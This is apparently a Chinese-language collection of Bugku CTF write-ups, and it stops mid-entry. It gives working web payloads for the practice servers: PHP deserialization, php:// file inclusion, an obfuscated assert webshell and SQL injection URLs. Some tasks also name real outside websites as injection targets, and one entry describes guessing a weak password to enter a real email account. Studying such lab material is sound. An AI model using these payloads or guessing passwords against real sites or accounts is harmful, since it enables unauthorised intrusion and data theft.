原来你也是老司机 Bugku{YOU_DID_IT_BY_SECOND} 速度要快 速度要快！！！！！！\nhttp://120.24.86.145:8002/web6/\n格式KEY{xxxxxxxxxxxxxx}\n1 2 3 4 5 抓包发现响应头有额外键值对 flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogT1RjeU5EYzQ= 值解码后为 跑的还不错，给你flag吧: NjE0NzY4 响应包内容如下 \u0026lt;/br\u0026gt;我感觉你得快点!!!\u0026lt;!-- OK ,now you have to post the margin what you find --\u0026gt; 要留意保持session。\n1 2 3 4 5 6 7 8 import requests import base64 url = \u0026#39;http://120.24.86.145:8002/web6/\u0026#39; ses=requests.session() r = ses.get(url) key = base64.b64decode(base64.b64decode(r.headers[\u0026#39;flag\u0026#39;]).split(\u0026#39; \u0026#39;)[1]) print ses.post(url, data={\u0026#39;margin\u0026#39;: key}).content #KEY{111dd62fcd377076be18a} cookie欺骗 http://120.24.86.145:8002/web11/\n答案格式：KEY{xxxxxxxx}\n重定向至http://120.24.86.145:8002/web11/index.php?line=\u0026amp;filename=a2V5cy50eHQ= ，发现可读源码。\n1 2 3 4 import requests for i in xrange(30): url=\u0026#39;http://120.24.86.145:8002/web11/index.php?line=%d\u0026amp;filename=aW5kZXgucGhw\u0026#39;%i print requests.get(url).content.strip() 读到index.php 如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php error_reporting(0); $file=base64_decode(isset($_GET[\u0026#39;filename\u0026#39;])?$_GET[\u0026#39;filename\u0026#39;]:\u0026#34;\u0026#34;); $line=isset($_GET[\u0026#39;line\u0026#39;])?intval($_GET[\u0026#39;line\u0026#39;]):0; if($file==\u0026#39;\u0026#39;) header(\u0026#34;location:index.php?line=\u0026amp;filename=a2V5cy50eHQ=\u0026#34;); $file_list = array( \u0026#39;0\u0026#39; =\u0026gt;\u0026#39;keys.txt\u0026#39;, \u0026#39;1\u0026#39; =\u0026gt;\u0026#39;index.php\u0026#39;, ); if(isset($_COOKIE[\u0026#39;margin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;margin\u0026#39;]==\u0026#39;margin\u0026#39;){ $file_list[2]=\u0026#39;keys.php\u0026#39;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?\u0026gt; 进一步读取keys.php\n1 2 3 4 import requests,base64 for i in xrange(30): url=\u0026#39;http://120.24.86.145:8002/web11/index.php?line=%d\u0026amp;filename=%s\u0026#39;%(i,base64.b64encode(\u0026#39;keys.php\u0026#39;)) print requests.get(url,headers={\u0026#39;cookie\u0026#39;:\u0026#39;margin=margin\u0026#39;}).content.strip() 读到keys.php 内容如下：\n1 \u0026lt;?php $key=\u0026#39;KEY{key_keys}\u0026#39;; ?\u0026gt; XSS http://103.238.227.13:10089/\nFlag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 关键代码： \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;XSS注入测试\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt; \u0026lt;p\u0026gt;1、请注入一段XSS代码，获取Flag值\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;2、必须包含alert(_key_)，_key_会自动被替换\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;s\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt;var s=\u0026#34;\u0026#34;;\tdocument.getElementById(\u0026#39;s\u0026#39;).innerHTML = s;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; ============================================================ 利用Unicode编码绕过 url: http://103.238.227.13:10089/?id=\\u003c_key_\\u003e Flag: 17f094325e90085b30a5ddefce34acd8 never give up http://120.24.86.145:8006/test/hello.php\n作者：御结冰城\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 直接访问120.24.86.145:8006/test/1p.html会被重定向 访问view-source:http://120.24.86.145:8006/test/1p.html得到 var Words =\u0026#34;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\u0026#34; ; print unescape(Words) //on chrome console //\u0026lt;script\u0026gt;window.location.href=\u0026#39;http://www.bugku.com\u0026#39;;\u0026lt;/script\u0026gt; \u0026lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--\u0026gt; print unescape(atob(\u0026#39;JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==\u0026#39;)) ------------------------------------------- if(!$_GET[\u0026#39;id\u0026#39;]){ header(\u0026#39;Location: hello.php?id=1\u0026#39;); exit(); } $id=$_GET[\u0026#39;id\u0026#39;]; $a=$_GET[\u0026#39;a\u0026#39;]; $b=$_GET[\u0026#39;b\u0026#39;]; if(stripos($a,\u0026#39;.\u0026#39;)){ echo \u0026#39;no no no no no no no\u0026#39;; return ; } $data = @file_get_contents($a,\u0026#39;r\u0026#39;); if($data==\u0026#34;bugku is a nice plateform!\u0026#34; and $id==0 and strlen($b)\u0026gt;5 and eregi(\u0026#34;111\u0026#34;.substr($b,0,1),\u0026#34;1114\u0026#34;) and substr($b,0,1)!=4){ require(\u0026#34;f4l2a3g.txt\u0026#34;); } else{ print \u0026#34;never never never give up !!!\u0026#34;; } ?\u0026gt; 1 2 3 http://120.24.86.145:8006/test/f4l2a3g.txt 得到flag{tHis_iS_THe_fLaG} 或者a=php://input\u0026amp;id=0\u0026amp;b=%00findneo....。。？？？？？？？ welcome to bugkuctf http://120.24.86.145:8006/test1/\n作者：pupil\n1 2 3 4 5 6 7 8 9 10 $user = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $pass = $_GET[\u0026#34;password\u0026#34;]; if(isset($user)\u0026amp;\u0026amp;(file_get_contents($user,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello admin!\u0026lt;br\u0026gt;\u0026#34;; include($file); //hint.php }else{ echo \u0026#34;you are not admin ! \u0026#34;; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 //http://120.24.86.145:8006/test1/?file=php://filter/convert.base64-encode/resource=index.php\u0026amp;txt=php://input //post welcome to the bugkuctf //index.php \u0026lt;?php $txt = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($txt)\u0026amp;\u0026amp;(file_get_contents($txt,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello friend!\u0026lt;br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;不能现在就给你flag哦\u0026#34;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo \u0026#34;you are not the number of bugku ! \u0026#34;; } ?\u0026gt; \u0026lt;!-- $user = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $pass = $_GET[\u0026#34;password\u0026#34;]; if(isset($user)\u0026amp;\u0026amp;(file_get_contents($user,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello admin!\u0026lt;br\u0026gt;\u0026#34;; include($file); //hint.php }else{ echo \u0026#34;you are not admin ! \u0026#34;; } --\u0026gt; ----------------------------------------------------------------------------------- //http://120.24.86.145:8006/test1/?file=php://filter/convert.base64-encode/resource=hint.php\u0026amp;txt=php://input //post welcome to the bugkuctf //hint.php \u0026lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;good\u0026#34;); } } } ?\u0026gt; 考察PHP反序列化。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php class Flag{ public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;good\u0026#34;); } } } $f=new Flag(); $f-\u0026gt;file=\u0026#39;flag.php\u0026#39;; var_dump(serialize($f)); //string(41) \u0026#34;O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;}\u0026#34; ?\u0026gt; ------------------------------------------------------------------------- 访问 view-source:http://120.24.86.145:8006/test1/?file=hint.php\u0026amp;txt=php://input\u0026amp;password=O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;} 同时post welcome to the bugkuctf 得到 flag{php_is_the_best_language} login http://47.93.190.246:49163/ flag格式：SKCTF{xxxxxxxxxxxxxxxxx} hint:SQL约束攻击\n注册一个用户名为admin 1 ，密码随意的用户，然后用admin和该密码登陆。SKCTF{4Dm1n_HaV3_GreAt_p0w3R}\n参考： http://www.freebuf.com/articles/web/124537.html\n过狗一句话 http://120.24.86.145:8010/\n送给大家一个过狗一句话\n1 \u0026lt;?php $poc=\u0026#34;a#s#s#e#r#t\u0026#34;; $poc_1=explode(\u0026#34;#\u0026#34;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[\u0026#39;s\u0026#39;]) ?\u0026gt; 1 2 3 view-source:http://120.24.86.145:8010/?s=var_dump(scandir(\u0026#39;.\u0026#39;)) view-source:http://120.24.86.145:8010/?s=var_dump(file_get_contents(\u0026#39;flag.txt\u0026#39;)) string(25) \u0026#34;BUGKU{bugku_web_009801_a}\u0026#34; maccms - 苹果cms 地址：http://120.24.86.145:8009/\nappcms http://120.24.86.145:8012/\nflag在根目录\n小明的博客 http://120.24.86.145:9003/\n请勿破坏靶场\n各种绕过哟 各种绕过哟\nhttp://120.24.86.145:8002/web7/\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(\u0026#39;flag.php\u0026#39;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); $flag = \u0026#39;flag{xxxxxxxxxxxxxxxxxx}\u0026#39;; if (isset($_GET[\u0026#39;uname\u0026#39;]) and isset($_POST[\u0026#39;passwd\u0026#39;])) { if ($_GET[\u0026#39;uname\u0026#39;] == $_POST[\u0026#39;passwd\u0026#39;]) print \u0026#39;passwd can not be uname.\u0026#39;; else if (sha1($_GET[\u0026#39;uname\u0026#39;]) === sha1($_POST[\u0026#39;passwd\u0026#39;])\u0026amp;($_GET[\u0026#39;id\u0026#39;]==\u0026#39;margin\u0026#39;)) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;sorry!\u0026#39;; } ?\u0026gt; 1 2 3 http://120.24.86.145:8002/web7/?uname[]=\u0026amp;id=margin post passwd[]=1 Flag: flag{HACK_45hhs_213sDD} WEB8 txt？？？？\nhttp://120.24.86.145:8002/web8/\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php extract($_GET); if (!empty($ac)){ $f = trim(file_get_contents($fn)); if ($ac === $f){ echo \u0026#34;\u0026lt;p\u0026gt;This is flag:\u0026#34; .\u0026#34; $flag\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo \u0026#34;\u0026lt;p\u0026gt;sorry!\u0026lt;/p\u0026gt;\u0026#34;; } } ?\u0026gt; 1 2 3 http://120.24.86.145:8002/web8/?ac=findneo\u0026amp;fn=php://input post findneo This is flag: flag{3cfb7a90fc0de31} 字符？正则？ 字符？正则？\nhttp://120.24.86.145:8002/web10/\n1 2 3 4 5 6 7 8 \u0026lt;?php highlight_file(\u0026#39;2.php\u0026#39;); $key=\u0026#39;KEY{********************************}\u0026#39;; $IM= preg_match(\u0026#34;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\u0026#34;, trim($_GET[\u0026#34;id\u0026#34;]), $match); if( $IM ){ die(\u0026#39;key is: \u0026#39;.$key); } ?\u0026gt; 1 2 http://120.24.86.145:8002/web10/?id=keykeyxxxxkey:/x/keyp[:punct:] key is: KEY{0x0SIOPh550afc} 考细心 地址：http://120.24.86.145:8002/web13/\n想办法变成admin\n扫描到 robots.txt，发现/resusl.php 页面响应中有if ($_GET[x]==$password) foo 。\n访问/web13/resusl.php?x=admin 得到flag(ctf_0098_lkji-s) 。\n代码审计 http://120.24.86.145:8002/web14/\n数据库没弄好 先别做这个题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 ﻿\u0026lt;?php include \u0026#34;config.php\u0026#34;; class HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-\u0026gt;method = $method; $this-\u0026gt;args = $args; $this-\u0026gt;__conn(); } function show() { list($username) = func_get_args(); $sql = sprintf(\u0026#34;SELECT * FROM users WHERE username=\u0026#39;%s\u0026#39;\u0026#34;, $username); $obj = $this-\u0026gt;__query($sql); if ( $obj != false ) { $this-\u0026gt;__die( sprintf(\u0026#34;%s is %s\u0026#34;, $obj-\u0026gt;username, $obj-\u0026gt;role) ); } else { $this-\u0026gt;__die(\u0026#34;Nobody Nobody But You!\u0026#34;); } } function login() { global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(\u0026#34;SELECT * FROM users WHERE username=\u0026#39;%s\u0026#39; AND password=\u0026#39;%s\u0026#39;\u0026#34;, $username, $password); if ( $username == \u0026#39;orange\u0026#39; || stripos($sql, \u0026#39;orange\u0026#39;) != false ) { $this-\u0026gt;__die(\u0026#34;Orange is so shy. He do not want to see you.\u0026#34;); } $obj = $this-\u0026gt;__query($sql); if ( $obj != false \u0026amp;\u0026amp; $obj-\u0026gt;role == \u0026#39;admin\u0026#39; ) { $this-\u0026gt;__die(\u0026#34;Hi, Orange! Here is your flag: \u0026#34; . $FLAG); } else { $this-\u0026gt;__die(\u0026#34;Admin only!\u0026#34;); } } function source() { highlight_file(__FILE__); } function __conn() { global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-\u0026gt;conn) $this-\u0026gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-\u0026gt;conn); if ($DEBUG) { $sql = \u0026#34;CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8\u0026#34;; $this-\u0026gt;__query($sql, $back=false); $sql = \u0026#34;INSERT INTO users VALUES (\u0026#39;orange\u0026#39;, \u0026#39;$db_pass\u0026#39;, \u0026#39;admin\u0026#39;), (\u0026#39;phddaa\u0026#39;, \u0026#39;ddaa\u0026#39;, \u0026#39;user\u0026#39;)\u0026#34;; $this-\u0026gt;__query($sql, $back=false); } mysql_query(\u0026#34;SET names utf8\u0026#34;); mysql_query(\u0026#34;SET sql_mode = \u0026#39;strict_all_tables\u0026#39;\u0026#34;); } function __query($sql, $back=true) { $result = @mysql_query($sql); if ($back) { return @mysql_fetch_object($result); } } function __die($msg) { $this-\u0026gt;__close(); header(\u0026#34;Content-Type: application/json\u0026#34;); die( json_encode( array(\u0026#34;msg\u0026#34;=\u0026gt; $msg) ) ); } function __close() { mysql_close($this-\u0026gt;conn); } function __destruct() { $this-\u0026gt;__conn(); if (in_array($this-\u0026gt;method, array(\u0026#34;show\u0026#34;, \u0026#34;login\u0026#34;, \u0026#34;source\u0026#34;))) { @call_user_func_array(array($this, $this-\u0026gt;method), $this-\u0026gt;args); } else { $this-\u0026gt;__die(\u0026#34;What do you do?\u0026#34;); } $this-\u0026gt;__close(); } function __wakeup() { foreach($this-\u0026gt;args as $k =\u0026gt; $v) { $this-\u0026gt;args[$k] = strtolower(trim(mysql_escape_string($v))); } } } if(isset($_GET[\u0026#34;data\u0026#34;])) { @unserialize($_GET[\u0026#34;data\u0026#34;]); } else { new HITCON(\u0026#34;source\u0026#34;, array()); } 求getshell 求getshell\nhttp://120.24.86.145:8002/web9/\nflag.php 地址：http://120.24.86.145:8002/flagphp/\n点了login咋没反应\n提示：hint\n根据提示访问http://120.24.86.145:8002/flagphp/?hint=1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php error_reporting(0); include_once(\u0026#34;flag.php\u0026#34;); $cookie = $_COOKIE[\u0026#39;ISecer\u0026#39;]; if(isset($_GET[\u0026#39;hint\u0026#39;])){ show_source(__FILE__); } elseif (unserialize($cookie) === \u0026#34;$KEY\u0026#34;) { echo \u0026#34;$flag\u0026#34;; } else { ?\u0026gt; \u0026lt;html\u0026gt;foo \u0026lt;/html\u0026gt; \u0026lt;?php } $KEY=\u0026#39;ISecer:www.isecer.com\u0026#39;; ?\u0026gt; 本以为请求头cookie添加键值对ISecer:s:21:\u0026quot;ISecer:www.isecer.com\u0026quot;; 即可。但这里很有趣，因为此处$KEY值仍为空，所以添加的键值对是ISecer:s:0:\u0026quot;\u0026quot;; 。flag{unserialize_by_virink}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php var_dump($foo); $foo=\u0026#39;foo\u0026#39;; var_dump($foo); var_dump($bar); ?\u0026gt; \u0026lt;?php $bar=\u0026#39;bar\u0026#39;; var_dump($bar); ---------------运行结果如下---------- Notice: Undefined variable: foo in C:\\Users\\*\\Desktop\\tets.php on line 2 NULL string(3) \u0026#34;foo\u0026#34; Notice: Undefined variable: bar in C:\\Users\\*\\Desktop\\tets.php on line 5 NULL string(3) \u0026#34;bar\u0026#34; PHP Notice: Undefined variable: foo in C:\\Users\\*\\Desktop\\tets.php on line 2 PHP Notice: Undefined variable: bar in C:\\Users\\*\\Desktop\\tets.php on line 5 INSERT INTO注入 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 地址：http://120.24.86.145:8002/web15/ flag格式：flag{xxxxxxxxxxxx} 不如写个Python吧 error_reporting(0); function getIp(){ $ip = \u0026#39;\u0026#39;; if(isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])){ $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; }else{ $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; } $ip_arr = explode(\u0026#39;,\u0026#39;, $ip); return $ip_arr[0]; } $host=\u0026#34;localhost\u0026#34;; $user=\u0026#34;\u0026#34;; $pass=\u0026#34;\u0026#34;; $db=\u0026#34;\u0026#34;; $connect = mysql_connect($host, $user, $pass) or die(\u0026#34;Unable to connect\u0026#34;); mysql_select_db($db) or die(\u0026#34;Unable to select database\u0026#34;); $ip = getIp(); echo \u0026#39;your ip is :\u0026#39;.$ip; $sql=\u0026#34;insert into client_ip (ip) values (\u0026#39;$ip\u0026#39;)\u0026#34;; mysql_query($sql); 文件包含2 http://47.93.190.246:49166/ flag格式：SKCTF{xxxxxxxxxxxxxxxx} hint:文件包含\n重定向到/index.php?file=hello.php ，响应头提示include.php ,注释提示upload.php 。\n1 2 3 4 5 6 7 8 9 403 http://47.93.190.246:49166/admin.phps http://47.93.190.246:49166/index.phps http://47.93.190.246:49166/login.phps http://47.93.190.246:49166/.htaccess 301 http://47.93.190.246:49166/upload 200 http://47.93.190.246:49166/upload.php 实战2-注入 http://www.kabelindo.co.id\nflag格式 flag{数据库最后一个表名字}\n这是一个神奇的登陆框 http://120.24.86.145:9001/sql/\nflag格式flag{}\n多次 http://120.24.86.145:9004\n本题有2个flag\nflag格式 flag{}\n1 2 3 4 5 6 7 8 9 10 11 12 http://120.24.86.145:9004/1ndex.php?id=5%27||ascii(mid(database(),1,1))=ascii(%27w%27)--+ GET /1ndex.php?id=5%27||ascii(mid(database(),1,1))=119--+ \u0026#39;\u0026#39;.join(map(chr,[119,101,98,49,48,48,50,45,49])) \u0026#39;web1002-1\u0026#39; http://120.24.86.145:9004/1ndex.php?id=5%27||ascii(mid(database(),1,1))%3E0--+ bingo=\u0026#34;There is nothing\u0026#34; ohno=\u0026#34;You can do some SQL injection in here\u0026#34; http://120.24.86.145:9004/1ndex.php?id=1%27||if(ascii(mid(select%20%22asdf%22,1,1))%3E0,sleep(10),0)--+ SQL注入2 http://120.24.86.145:8007/web2/\n全都tm过滤了绝望吗？\n提示 !,!=,=,+,-,^,%\nwordpress http://wp.bugku.com/\n出题花了10分钟，应该很简单的，\n进网站看看就明白了。\n需要用到渗透测试第一步信息收集\nlogin2 http://47.93.190.246:49165/ SKCTF{xxxxxxxxxxxxxxxxxxxxx} hint:union，命令执行\n来源：山科大\nlogin3 http://47.93.190.246:49167/ flag格式：SKCTF{xxxxxxxxxxxxx} hint：基于布尔的SQL盲注\n来源：山科大\n报错注入 http://103.238.227.13:10088/ FLAG格式 Flag:””\n实战1-注入 http://www.interplay.com\nflag格式 flag{数据库的第一个表名}\nTrim的日记本 http://120.24.86.145:9002/\nhint：不要一次就放弃\nlogin4 http://47.93.190.246:49168/ flag格式：SKCTF{xxxxxxxxxxxxxxxx} hint:CBC字节翻转攻击\n来源：山科大\nSocial 密码？？？ 姓名：张三 生日；19970315\nKEY格式KEY{xxxxxxxxxx}\nKEY{zs19970315}\n信息查找？？？ 社会工程学基础题目 信息查找\n听说bugku.cn 在今日头条上能找到？？\n提示：flag为群号码\n格式KEY{xxxxxxxxxxx}\n访问https://www.google.com/search?q=bugku.cn+site%3Atoutiao.com ，得到462713425\n入门题目，社工帝？ name:孤长离\n提示：弱口令\n搜索孤长离到一个贴吧，弱口令登陆邮箱bkctftest@163.com 得到KEY{sg1H78Si9C0s99Q} 。\n简单的社工尝试 这个狗就是我画的，而且当了头像 这题提示的其实很明显了 想想吧\n谷歌识图到达https://github.com/bugku ，然后到https://weibo.com/bugku ，然后是http://c.bugku.com/13211.txt ，就得到flag{BUku_open_shgcx1} 。\nCrypto 滴答~滴 -\u0026hellip; -.- -.-. - ..-. \u0026ndash; .. \u0026hellip; -.-.\n答案格式KEY{xxxxxxxxx}\nkey{bkctfmisc}\n推荐这个小工具\n聪明的小羊 一只小羊翻过了2个栅栏\nKYsd3js2E{a2jda}\nKEY{sad23jjdsa2}\n推荐这个小工具\nok Ook!解混淆\nflag{ok-ctf-1234-admin}\n这不是摩斯密码 Brainfuck解混淆\nflag{ok-c2tf-3389-admin}\n+[]- Brainfuck解混淆\nflag{bugku_jiami_23}\nzip伪加密 将第六字节改为00即可。flag{Adm1N-B2G-kU-SZIP} 代码审计 md5()函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 http://120.24.86.145:9009/18.php \u0026lt;?php error_reporting(0); $flag = \u0026#39;flag{test}\u0026#39;; if (isset($_GET[\u0026#39;username\u0026#39;]) and isset($_GET[\u0026#39;password\u0026#39;])) { if ($_GET[\u0026#39;username\u0026#39;] == $_GET[\u0026#39;password\u0026#39;]) print \u0026#39;Your password 